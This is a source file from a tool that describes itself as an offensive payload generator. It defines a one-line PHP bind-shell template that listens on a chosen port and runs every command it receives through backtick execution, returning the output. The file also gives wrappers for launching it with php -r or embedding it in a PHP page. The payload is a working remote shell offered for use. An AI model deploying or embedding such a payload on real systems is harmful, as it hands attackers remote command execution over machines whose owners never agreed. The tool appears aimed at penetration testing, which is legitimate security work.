#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

USAGE = 'port'
NARGS = [1, 1]
LANG = 'php'
EXEC = '''
php -r 'PAYLOAD'
<?php PAYLOAD
'''


pl = '''
$VAR0=socket_create(2,1,6);socket_bind($VAR0,"0.0.0.0",ARG1);socket_listen($VAR0);$VAR1=socket_accept($VAR0);while(NUM0){$VAR2=socket_read($VAR1,4096);if(!$VAR2){die();};socket_write($VAR1,`$VAR2`);};
'''
